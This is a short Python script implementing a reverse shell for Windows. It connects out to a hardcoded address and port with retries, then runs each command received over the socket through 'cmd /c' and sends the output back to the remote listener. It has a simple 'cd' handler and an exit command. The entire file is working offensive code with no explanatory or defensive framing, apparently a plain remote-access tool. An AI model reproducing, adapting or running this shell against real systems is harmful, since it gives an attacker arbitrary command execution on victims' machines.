import subprocess, socket, time, os


ipv4_address = '192.168.142.128'
port = 65
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    conn = sock.connect((ipv4_address, port))
except:
    for i in range(0,5):
        try:
            conn = sock.connect((ipv4_address, port))
        except:
            time.sleep(1)
            continue
        else:
            time.sleep(1)
            sock.send("\n[+] Successfully connected. This is only a semi-interactive shell.\n\n".encode())
            break
else:
    time.sleep(1)
    sock.send("\n[+] Successfully connected. This is only a semi-interactive shell.\n\n".encode())

while True:
    sock.send((os.getcwd() + ">").encode())
    msg = sock.recv(1024)
    if "cd" in msg.decode().strip("\n").split():
        try:
            os.chdir(msg.decode().replace("cd", "").strip())
        except:
            sock.send("Failed to change directory.\n".encode())
    elif msg.decode().strip("\n") == "exit" or msg.decode().strip("\n") == "logout":
        sock.send("\nDisconnected...Bye!\n".encode())
        sock.shutdown(socket.SHUT_RDWR) # close connection
        sock.close() # deallocate socket handle
        break
    else:
        try:
            sock.send(subprocess.check_output('cmd /c ' + msg.decode(), shell = True) + "\n".encode())
        except:
            sock.send("[-] Command failed.\n".encode())

